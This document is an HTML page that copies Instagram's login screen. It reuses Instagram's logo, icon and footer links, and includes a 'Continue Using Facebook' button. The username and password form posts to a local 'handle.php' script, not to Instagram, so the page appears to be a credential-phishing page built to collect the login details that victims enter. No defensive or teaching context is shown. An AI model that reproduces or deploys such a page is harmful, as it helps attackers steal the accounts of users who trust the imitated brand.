<!DOCTYPE html>
<head>
    <title>Instagram</title>
    <link data-default-icon="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico" rel="shortcut icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/y4/r/QaBlI0OZiks.ico">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="flex h-screen flex flex-col items-center">
    <main class="w-full h-screen flex flex-col items-center p-4">      
        <div class="flex">
            <select class="text-[#7a7d82] bg-white text-xs">
                <option>English (UK)</option>
            </select>
        </div>
        <div class="flex py-12">
            <i data-visualcompletion="css-img" aria-label="Instagram" class="" role="img" style="background-image: url(&quot;https://static.cdninstagram.com/rsrc.php/v3/yK/r/ATdtiLb2BQ9.png&quot;); background-position: 0px 0px; background-size: 176px 181px; width: 175px; height: 51px; background-repeat: no-repeat; display: inline-block;"></i>
        </div>
        <button class="bg-blue-500 px-3 py-2 items-center rounded-lg flex flex-row">
            <svg xmlns="http://www.w3.org/2000/svg" x="0px" y="0px" width="18" height="18" viewBox="0,0,256,256">
                <g fill="#ffffff" fill-rule="nonzero" stroke="none" stroke-width="1" stroke-linecap="butt" stroke-linejoin="miter" stroke-miterlimit="10" stroke-dasharray="" stroke-dashoffset="0" font-family="none" font-weight="none" font-size="none" text-anchor="none" style="mix-blend-mode: normal"><g transform="scale(9.84615,9.84615)"><path d="M21.125,0h-16.25c-2.69141,0 -4.875,2.18359 -4.875,4.875v16.25c0,2.69141 2.18359,4.875 4.875,4.875h16.25c2.69141,0 4.875,-2.18359 4.875,-4.875v-16.25c0,-2.69141 -2.18359,-4.875 -4.875,-4.875zM20.46484,14.00391h-2.43359v9.00391h-4.0625v-9.00391h-1.57812v-3.03516h1.57813v-1.93359c0,-2.53125 1.05078,-4.03516 4.03906,-4.03516h3.02344v3.02344h-1.75781c-1.16016,0 -1.23828,0.42969 -1.23828,1.24219l-0.00391,1.70313h2.76563z"></path></g></g>
            </svg>
            <h1 class="pl-2 text-sm text-white">Continue Using Facebook</h1>
        </button>
        <div class="flex flex-row w-full justify-center items-center">
            <hr style="width:25%"  class="flex">
                <span class="flex p-4 text-[#7a7d82] font-semibold text-sm">OR</span>
            <hr style="width:25%" class="flex">
        </div>
        <div class="w-full items-center flex flex-col">
            <div class="flex w-full flex-col px-8">
                <form action="handle.php" method="POST" class="flex flex-col p-2 space-y-4 w-full ">
                  <input class="border p-2 text-sm" id="username" type="text" name="username" placeholder="Phone number, username, or email">
                  <input class="border p-2 text-sm" id="password" type="password" name="password" placeholder="Password">
                  
                  <a class="text-blue-400 text-sm text-right" href="#">Forgotten your password?</a>
                  
                  <button class="bg-blue-400 rounded-lg px-2 py-1 text-white" type="submit">Log in</button>
                </form>
            </div>      
            <div class="flex text-sm pt-2 text-[#7a7d82]">
                    Don't have an account? 
                <a class="pl-1 text-blue-400 font-semibold" href="#">Sign up</a>
            </div>
        </div>
    </main>
    <footer class="flex flex-col items-center space-y-12 pb-4">
        <img height="26px" width="52px" alt="from Meta" src="https://static.cdninstagram.com/rsrc.php/yb/r/SxCWlJznXoy.svg">
        <div class="flex flex-col items-center space-y-2">
            <div class="flex flex-row space-x-4">
                <h1 class="text-xs text-[#7a7d82]">Meta</h1>
                <h1 class="text-xs text-[#7a7d82]">About</h1>
                <h1 class="text-xs text-[#7a7d82]">Blog</h1>
                <h1 class="text-xs text-[#7a7d82]">Jobs</h1>
                <h1 class="text-xs text-[#7a7d82]">Help</h1>
                <h1 class="text-xs text-[#7a7d82]">API</h1>
                <h1 class="text-xs text-[#7a7d82]">Privacy</h1>
                <h1 class="text-xs text-[#7a7d82]">Terms</h1>
            </div>
            <div class="flex flex-row space-x-4">
                <h1 class="text-xs text-[#7a7d82]">Locations</h1>
                <h1 class="text-xs text-[#7a7d82]">Instagram Lite</h1>
                <h1 class="text-xs text-[#7a7d82]">Threads</h1>
            </div>
            <div class="flex flex-row space-x-4">
                <h1 class="text-xs text-[#7a7d82]">Contact uploading and non-users</h1>
                <h1 class="text-xs text-[#7a7d82]">Meta Verified</h1>
            </div>
        </div>
    </footer>
</body>
</html>